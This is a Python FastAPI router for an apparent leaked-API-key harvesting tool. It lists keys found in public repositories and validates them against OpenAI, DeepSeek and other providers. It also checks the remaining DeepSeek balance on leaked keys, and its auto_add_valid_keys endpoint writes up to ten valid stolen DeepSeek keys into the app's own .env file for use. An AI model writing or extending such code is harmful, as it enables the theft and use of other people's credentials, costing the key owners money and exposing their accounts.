import asyncio
from datetime import datetime, timezone

from fastapi import APIRouter, Depends, HTTPException, Query
from sqlalchemy import case, func, select
from sqlalchemy.ext.asyncio import AsyncSession

from app.auth import require_auth
from app.database import get_db
from app.models import Leak
from app.scanner.validator import (
    validate_key, validate_openai_multi, query_deepseek_balance,
    validate_deepseek_with_fallback, revalidate_verified_url,
)
from app.schemas import (
    BalanceResponse,
    LeakListResponse,
    LeakResponse,
    ValidateAllResponse,
    ValidateResultSummary,
)

router = APIRouter(prefix="/api/leaks", tags=["leaks"])


@router.get("", response_model=LeakListResponse)
async def list_leaks(
    page: int = Query(1, ge=1),
    limit: int = Query(20, ge=1, le=100),
    provider: str | None = None,
    exclude_provider: str | None = None,
    key_status: str | None = None,
    db: AsyncSession = Depends(get_db),
    _: str = Depends(require_auth),
):
    query = select(Leak).order_by(Leak.leak_detected_at.desc())
    count_query = select(func.count(Leak.id))

    # effective_provider: 优先 verified_provider，否则回退到 provider
    eff_provider = case(
        (Leak.verified_provider != "", Leak.verified_provider),
        else_=Leak.provider,
    )

    if provider:
        query = query.where(eff_provider == provider)
        count_query = count_query.where(eff_provider == provider)
    elif exclude_provider:
        query = query.where(eff_provider != exclude_provider)
        count_query = count_query.where(eff_provider != exclude_provider)

    if key_status:
        query = query.where(Leak.key_status == key_status)
        count_query = count_query.where(Leak.key_status == key_status)
    elif provider:
        query = query.where(Leak.key_status != "filtered")
        count_query = count_query.where(Leak.key_status != "filtered")
    else:
        query = query.where(Leak.key_status.notin_(("filtered", "unsupported")))
        count_query = count_query.where(Leak.key_status.notin_(("filtered", "unsupported")))

    total = (await db.execute(count_query)).scalar() or 0
    offset = (page - 1) * limit
    rows = (await db.execute(query.offset(offset).limit(limit))).scalars().all()

    return LeakListResponse(
        leaks=[LeakResponse.model_validate(r) for r in rows],
        total=total,
        has_more=offset + limit < total,
    )


@router.post("/validate-all", response_model=ValidateAllResponse)
async def validate_all_leaks(
    db: AsyncSession = Depends(get_db),
    _: str = Depends(require_auth),
):
    """Validate all unchecked keys concurrently."""
    rows = (await db.execute(
        select(Leak).where(Leak.key_status == "unchecked")
    )).scalars().all()

    if not rows:
        return ValidateAllResponse(
            validated=0,
            results=ValidateResultSummary(valid=0, invalid=0, unchecked=0),
        )

    # 并发验证（信号量限制并发数）
    sem = asyncio.Semaphore(5)

    async def _val(leak: Leak) -> tuple[str, str, str]:
        async with sem:
            if leak.provider == "openai" and not leak.raw_key.startswith("sk-proj-"):
                return await validate_openai_multi(
                    leak.raw_key, leak.repo_url, leak.file_path)
            if leak.provider == "deepseek":
                return await validate_deepseek_with_fallback(
                    leak.raw_key, leak.repo_url, leak.file_path)
            return (await validate_key(leak.provider, leak.raw_key), "", "")

    val_results = await asyncio.gather(*[_val(l) for l in rows])

    results = {"valid": 0, "invalid": 0, "unchecked": 0}
    now = datetime.now(timezone.utc)
    for leak, (status, v_provider, v_url) in zip(rows, val_results):
        leak.key_status = status
        leak.validated_at = now
        if v_provider:
            leak.verified_provider = v_provider
        if v_url:
            leak.verified_url = v_url
        bucket = status if status in results else "unchecked"
        results[bucket] += 1

    await db.commit()
    return ValidateAllResponse(
        validated=len(rows),
        results=ValidateResultSummary(**results),
    )


@router.post("/{leak_id}/validate", response_model=LeakResponse)
async def validate_single_leak(
    leak_id: int,
    db: AsyncSession = Depends(get_db),
    _: str = Depends(require_auth),
):
    """Validate a single key by leak ID."""
    leak = (await db.execute(
        select(Leak).where(Leak.id == leak_id)
    )).scalar_one_or_none()

    if not leak:
        raise HTTPException(404, "Leak not found")

    # Priority: re-validate against previously verified URL if available
    if leak.verified_url:
        result = await revalidate_verified_url(leak.raw_key, leak.verified_url)
        if result is not None:
            leak.key_status = result
            leak.validated_at = datetime.now(timezone.utc)
            await db.commit()
            await db.refresh(leak)
            return LeakResponse.model_validate(leak)
        # inconclusive, fall through to full validation

    if leak.provider == "openai" and not leak.raw_key.startswith("sk-proj-"):
        status, v_provider, v_url = await validate_openai_multi(
            leak.raw_key, leak.repo_url, leak.file_path)
        leak.key_status = status
        if v_provider:
            leak.verified_provider = v_provider
        if v_url:
            leak.verified_url = v_url
    elif leak.provider == "deepseek":
        status, v_provider, v_url = await validate_deepseek_with_fallback(
            leak.raw_key, leak.repo_url, leak.file_path)
        leak.key_status = status
        if v_provider:
            leak.verified_provider = v_provider
        if v_url:
            leak.verified_url = v_url
    else:
        leak.key_status = await validate_key(leak.provider, leak.raw_key)
    leak.validated_at = datetime.now(timezone.utc)
    await db.commit()
    await db.refresh(leak)
    return LeakResponse.model_validate(leak)


@router.get("/{leak_id}/balance", response_model=BalanceResponse)
async def get_leak_balance(
    leak_id: int,
    db: AsyncSession = Depends(get_db),
    _: str = Depends(require_auth),
):
    """Query DeepSeek key balance."""
    leak = (await db.execute(
        select(Leak).where(Leak.id == leak_id)
    )).scalar_one_or_none()

    if not leak:
        raise HTTPException(404, "Leak not found")
    if leak.provider != "deepseek":
        raise HTTPException(400, "Balance query only supports deepseek")

    data = await query_deepseek_balance(leak.raw_key)
    if "error" in data:
        raise HTTPException(502, f"Balance query failed: {data['error']}")
    return data


@router.post("/auto-add-valid-keys")
async def auto_add_valid_keys(
    db: AsyncSession = Depends(get_db),
    _: str = Depends(require_auth),
):
    """自动将有效的DeepSeek密钥添加到配置中"""
    import os
    from pathlib import Path

    # 查询所有有效的DeepSeek密钥
    valid_leaks = (await db.execute(
        select(Leak).where(
            Leak.provider == "deepseek",
            Leak.key_status == "valid"
        ).order_by(Leak.leak_detected_at.desc())
    )).scalars().all()

    if not valid_leaks:
        return {"message": "没有找到有效的DeepSeek密钥", "added": 0}

    # 读取现有配置
    env_file = Path(__file__).parent.parent.parent.parent / ".env.backend"

    if not env_file.exists():
        return {"error": "配置文件不存在", "added": 0}

    # 读取现有内容
    with open(env_file, "r", encoding="utf-8") as f:
        lines = f.readlines()

    # 查找DEEPSEEK_API_KEY行
    deepseek_line_idx = -1
    for i, line in enumerate(lines):
        if line.startswith("DEEPSEEK_API_KEY="):
            deepseek_line_idx = i
            break

    # 收集所有有效密钥
    valid_keys = [leak.raw_key for leak in valid_leaks[:10]]  # 最多添加10个
    keys_str = ",".join(valid_keys)

    # 更新配置
    if deepseek_line_idx >= 0:
        lines[deepseek_line_idx] = f"DEEPSEEK_API_KEY={keys_str}\n"
    else:
        # 在AI配置部分添加
        for i, line in enumerate(lines):
            if "AI 模型配置" in line or "DEEPSEEK" in line:
                lines.insert(i + 1, f"DEEPSEEK_API_KEY={keys_str}\n")
                break

    # 写回文件
    with open(env_file, "w", encoding="utf-8") as f:
        f.writelines(lines)

    return {
        "message": f"成功添加 {len(valid_keys)} 个有效的DeepSeek密钥到配置",
        "added": len(valid_keys),
        "keys": [f"{k[:20]}...{k[-8:]}" for k in valid_keys]
    }
